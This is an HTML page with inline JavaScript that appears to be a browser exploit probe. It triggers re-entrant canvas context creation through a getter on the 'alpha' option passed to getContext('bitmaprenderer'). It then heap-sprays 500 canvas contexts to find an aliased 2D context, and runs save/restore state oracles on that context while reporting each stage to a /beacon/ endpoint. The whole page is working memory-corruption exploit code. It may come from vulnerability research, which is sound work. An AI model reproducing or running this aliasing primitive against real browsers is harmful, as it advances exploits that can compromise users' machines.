<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>V966B</title></head>
<body><pre id="out">V966B — alias font/textAlign/textBaseline/direction/imageSmoothing × save/restore oracle (B)</pre>
<script>
'use strict';
var O=document.getElementById('out');
var RUN='r'+Date.now().toString(36)+Math.random().toString(36).slice(2,6);
var al=null;
function say(s){O.textContent+='\n'+s;}
function bk(tag,body){try{new Image().src='/beacon/V966B-'+tag+'?d='+encodeURIComponent(String(body==null?'':body).slice(0,700))+'&run='+encodeURIComponent(RUN)+'&t='+Date.now()+'&s=1';}catch(e){}}
window.onerror=function(msg,src,line){ bk('ERR','onerror:'+String(msg)+'@'+line); };
function st(){
  try{
    var dir=('direction' in al)?al.direction:'na';
    var ls=('letterSpacing' in al)?al.letterSpacing:'na';
    var ws=('wordSpacing' in al)?al.wordSpacing:'na';
    var fq=('fontKerning' in al)?al.fontKerning:'na';
    return 'font='+al.font+'|ta='+al.textAlign+'|tb='+al.textBaseline+'|dir='+dir+'|sm='+al.imageSmoothingEnabled+'|sq='+al.imageSmoothingQuality+'|ls='+ls+'|ws='+ws+'|fk='+fq;
  }catch(e){ return 'stEx:'+String(e&&e.name)+':'+String(e).slice(0,80); }
}
function snap(stage,exp){ var got=st(); var m=(exp==null)?'-':(got===exp?1:0); bk(stage,'got='+got+(exp!=null?'|m='+m:'')); return m; }
async function establishAlias(){
  bk('BOOT','alias font/text/smoothing × save/restore; run='+RUN);
  var inner=null;
  var c=document.createElement('canvas'); c.width=64; c.height=64;
  var settings={};
  Object.defineProperty(settings,'alpha',{get:function(){ try{ inner=c.getContext('2d'); }catch(e){} return true; }});
  try{ c.getContext('bitmaprenderer', settings); }catch(e){ bk('BMR-ERR',String(e&&e.name)); }
  if(!inner){ bk('NO-INNER',''); return false; }
  bk('INNER','ok');
  var spray=[];
  for(var i=0;i<500;i++){ var c2=document.createElement('canvas'); c2.width=64; c2.height=64; var g=c2.getContext('2d'); g.lineWidth=1000+i; spray.push({c:c2,g:g}); }
  bk('SPRAY','500');
  var found=-1;
  try{ inner.lineWidth=15151.15; }catch(e){ bk('W1-ERR',String(e)); return false; }
  for(var i=0;i<spray.length;i++){ try{ if(Math.abs(spray[i].g.lineWidth-15151.15)<0.01){ found=i; al=spray[i].g; break; } }catch(e){} }
  bk('ALIAS', found>=0?('idx='+found):'MISS');
  return found>=0;
}
(async function(){
  if(!(await establishAlias())){ bk('DONE','no-alias/stop'); say('no alias'); return; }
  bk('S0-PRE','baseline');
  try{
    al.font='10px sans-serif'; al.textAlign='start'; al.textBaseline='alphabetic';
    if('direction' in al) al.direction='inherit';
    al.imageSmoothingEnabled=true; al.imageSmoothingQuality='low';
    if('letterSpacing' in al) al.letterSpacing='0px';
    if('wordSpacing' in al) al.wordSpacing='0px';
    if('fontKerning' in al) al.fontKerning='auto';
  }catch(e){ bk('S0-EX',String(e)); }
  var base=st(); snap('S0-OK',base);
  bk('A-PRE','mutate+restore');
  try{
    al.save();
    al.font='bold 24px monospace'; al.textAlign='center'; al.textBaseline='middle';
    if('direction' in al) al.direction='rtl';
    al.imageSmoothingEnabled=false; al.imageSmoothingQuality='high';
    if('letterSpacing' in al) al.letterSpacing='5px';
    if('wordSpacing' in al) al.wordSpacing='10px';
    if('fontKerning' in al) al.fontKerning='none';
    snap('A-mut',null);
    al.restore(); snap('A-rest',base);
  }catch(e){ bk('A-EX',String(e&&e.name)+':'+String(e).slice(0,120)); }
  bk('B-PRE','nested3');
  try{
    al.save(); al.font='italic 16px serif'; al.textAlign='left';
    al.save(); al.textBaseline='top'; al.imageSmoothingEnabled=false;
    al.save(); al.textAlign='right'; if('direction' in al) al.direction='ltr'; al.imageSmoothingQuality='medium';
    snap('B-d3',null);
    al.restore(); snap('B-r3',null);
    al.restore(); snap('B-r2',null);
    al.restore(); snap('B-r1',base);
  }catch(e){ bk('B-EX',String(e&&e.name)+':'+String(e).slice(0,120)); }
  bk('C-PRE','50 cycles');
  var ok=0;
  var tas=['start','end','left','right','center'];
  var tbs=['alphabetic','top','hanging','middle','ideographic','bottom'];
  try{
    for(var i=0;i<50;i++){
      al.save();
      al.font=(10+i)+'px sans-serif'; al.textAlign=tas[i%tas.length]; al.textBaseline=tbs[i%tbs.length];
      al.imageSmoothingEnabled=(i%2===0);
      if('direction' in al) al.direction=(i%3===0?'rtl':(i%3===1?'ltr':'inherit'));
      if('letterSpacing' in al) al.letterSpacing=(i%7)+'px';
      al.restore();
      if(st()===base) ok++;
    }
  }catch(e){ bk('C-EX',String(e&&e.name)+':'+String(e).slice(0,120)); }
  bk('C-OK','ok='+ok+'/50');
  snap('C-snap',base);
  bk('DONE','font/text/smoothing savestack complete; m=0/EX/crash=signal');
  say('done run='+RUN);
})();
</script>
</body></html>
